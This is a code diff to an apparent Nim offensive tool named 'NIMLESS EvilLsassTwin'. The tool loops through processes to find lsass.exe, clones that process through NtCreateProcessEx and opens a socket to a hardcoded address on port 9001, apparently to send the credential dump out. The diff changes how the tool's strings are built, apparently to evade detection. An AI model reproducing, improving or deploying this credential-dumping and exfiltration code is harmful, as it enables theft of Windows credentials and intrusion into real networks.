@@ -51,13 +51,15 @@ proc SetPrivilege(ninst: ptr NIMLESS_INSTANCE, hToken: HANDLE): bool =
   return true
 
 proc main() {.exportc: "Main".} =
-  var ninst: NIMLESS_INSTANCE
+  var 
+    ninst: NIMLESS_INSTANCE
+    tmpFileName {.stackStringA.} = "twin.txt"
+    sLsass {.stackStringA.} = "lsass.exe"
+    sUrl {.stackStringA.} = "0.0.0.0"
+    
   discard init(ninst)
 
   PRINTA(ninst.addr, "NIMLESS EvilLsassTwin\n".cstring)
-  PRINTA(ninst.addr, " \\__> Size of Instance: %i\n".cstring, sizeof(ninst))
-  PRINTA(ninst.addr, " \\__> Size of    Win32: %i\n".cstring, sizeof(ninst.Win32))
-  PRINTA(ninst.addr, " \\__> Address of ninst: 0x%p\n".cstring, cast[int](ninst.addr))
 
   var
     pGetLastError = ninst.Win32.GetLastError
@@ -68,7 +70,7 @@ proc main() {.exportc: "Main".} =
     pNtGetNextProcess = ninst.Win32.NtGetNextProcess
     pNtCreateProcessEx = ninst.Win32.NtCreateProcessEx
     pQueryFullProcessImageNameA = ninst.Win32.QueryFullProcessImageNameA
-    #plstrcmpiA = ninst.Win32.lstrcmpiA
+    plstrcmpiA = ninst.Win32.lstrcmpiA
     pPathFindFileNameA = ninst.Win32.PathFindFileNameA
     pGetProcessId = ninst.Win32.GetProcessId
     pCreateFileA = ninst.Win32.CreateFileA
@@ -86,9 +88,6 @@ proc main() {.exportc: "Main".} =
     psend = ninst.Win32.send
     pshutdown = ninst.Win32.shutdown
 
-    sUrl: array[11, char]
-    sLsass: array[10, char]
-    tmpFileName {.stackStringA.} = "twin.txt"
     hToken: HANDLE
     victimHandle: HANDLE
     bufSize: DWORD = MAX_PATH
@@ -97,29 +96,6 @@ proc main() {.exportc: "Main".} =
     hClone: HANDLE
     IoStatusBlock: IO_STATUS_BLOCK
     fileDI: FILE_DISPOSITION_INFORMATION
-  
-  sLsass[0] = 'l'
-  sLsass[1] = 's'
-  sLsass[2] = 'a'
-  sLsass[3] = 's'
-  sLsass[4] = 's'
-  sLsass[5] = '.'
-  sLsass[6] = 'e'
-  sLsass[7] = 'x'
-  sLsass[8] = 'e'
-  sLsass[9] = '\0'
-
-  sUrl[0] = '1'
-  sUrl[1] = '0'
-  sUrl[2] = '.'
-  sUrl[3] = '1'
-  sUrl[4] = '.'
-  sUrl[5] = '2'
-  sUrl[6] = '.'
-  sUrl[7] = '1'
-  sUrl[8] = '0'
-  sUrl[9] = '9'
-  sUrl[10] = '\0'
 
   fileDI.DoDeleteFile = TRUE
   InitializeObjectAttributes(addr procOA, NULL, 0, cast[HANDLE](NULL), NULL)
@@ -149,7 +125,7 @@ proc main() {.exportc: "Main".} =
   #PRINTA(ninst.addr, "\nvictimHandle Address: 0x%p".cstring, victimHandle.addr)
   while pNtGetNextProcess(victimHandle, MAXIMUM_ALLOWED, 0, 0, addr victimHandle) == 0:
     zeroMem(procName, MAX_PATH)
-    PRINTA(ninst.addr, "\nLoop Count: %i".cstring, count)
+    #PRINTA(ninst.addr, "\nLoop Count: %i".cstring, count)
     PRINTA(ninst.addr, "\n[!] Obtained Handle Value: 0x%i".cstring, victimHandle)
     
     if pQueryFullProcessImageNameA(victimHandle, 0, procName, bufSize.addr) == 0:
@@ -165,13 +141,16 @@ proc main() {.exportc: "Main".} =
     PRINTA(ninst.addr, "\n[!] Process Name: %s\n".cstring, pPathFindFileNameA(procName))
     bufSize = MAX_PATH
     
-    #if plstrcmpiA("lsass.exe".cstring, pPathFindFileNameA(procName)) == 0:
-    if cmpIgnoreCase(cast[cstring](sLsass[0].addr), cast[cstring](pPathFindFileNameA(procName))) == 0:
+    #if plstrcmpiA(cstrLsass, pPathFindFileNameA(procName)) == 0:
+    #if cmpIgnoreCase(cast[cstring](sLsass[0].addr), cast[cstring](pPathFindFileNameA(procName))) == 0:
+    if cmpIgnoreCase(CPTR(sLsass), cast[cstring](pPathFindFileNameA(procName))) == 0:
       pid = pGetProcessId(victimHandle)
       PRINTA(ninst.addr, cast[cstring]("\n[+] Found PID %i and Obtained Handle 0x%i\n"), pid, victimHandle)
       break
     
     count += 1
+  
+    if count >= 20: break
 
   if victimHandle == 0:
     PRINTA(ninst.addr, "[-] Failed to Obtain Handle to Process! Error: %i\n[!] Quitting...", pGetLastError())
@@ -228,7 +207,8 @@ proc main() {.exportc: "Main".} =
   var sa: sockaddr_in
   
   sa.sin_family = AF_INET
-  sa.sinaddr.S_addr = pinet_addr(sUrl[0].addr)
+  #sa.sinaddr.S_addr = pinet_addr(sUrl[0].addr)
+  sa.sinaddr.S_addr = pinet_addr(CPTR(sUrl))
   sa.sin_port = phtons(9001)
 
   discard pconnect(socket, cast[ptr sockaddr](sa.addr), cast[int32](sizeof(sa)))
